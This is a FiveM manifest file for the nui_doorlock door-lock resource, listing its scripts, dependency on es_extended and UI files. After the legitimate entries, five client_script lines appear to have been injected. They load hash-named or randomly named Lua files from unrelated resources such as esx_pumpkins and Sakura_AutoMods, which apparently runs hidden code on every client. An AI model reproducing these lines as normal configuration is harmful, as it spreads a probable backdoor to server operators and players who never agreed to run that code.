fx_version 'cerulean'
games { 'gta5' }

version '1.10.0'
description 'https://github.com/thelindat/nui_doorlock'
versioncheck 'https://raw.githubusercontent.com/thelindat/nui_doorlock/main/fxmanifest.lua'

server_scripts {
	'@es_extended/locale.lua',
	'config.lua',
	'configs/**/*.lua',
	'server/main.lua'
}

client_scripts {
	'@es_extended/locale.lua',
	'config.lua',
	'configs/**/*.lua',
	'client/main.lua'
}

dependency 'es_extended'

ui_page {
    'html/door.html',
}

files {
	'html/door.html',
	'html/main.js', 
	'html/style.css',

	'html/sounds/*.ogg',
}
client_script '@esx_pumpkins/50b308aa8af3157b04c2e0e8967e326a.lua'
client_script "api-ac_MSixQhPKmCnf.lua"
client_script "api-ac_xUkMANoRzPVS.lua"
client_script "api-ac_IaWDYjheHvJp.lua"


client_script '@Sakura_AutoMods/xDxDxDxDxD.lua'